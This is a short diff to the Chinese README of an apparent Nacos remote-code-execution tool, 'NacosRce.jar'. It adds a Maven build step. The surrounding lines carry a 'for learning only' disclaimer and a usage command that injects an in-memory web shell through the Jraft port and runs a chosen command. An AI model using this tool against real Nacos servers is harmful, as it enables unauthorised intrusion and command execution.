@@ -11,6 +11,10 @@
 <br />Author: 刨洞安全 && 凉风<br />
 <br />注意：工具仅供学习使用，请勿滥用，否则后果自负！
 
+<br />**编译方法 **<br />
+```bash
+mvn clean package
+```
 <br />**食用方式 **<br />
 1. 自动注入内存马并执行命令	java -jar NacosRce.jar Url Jraft端口 "Command"
    <br />	
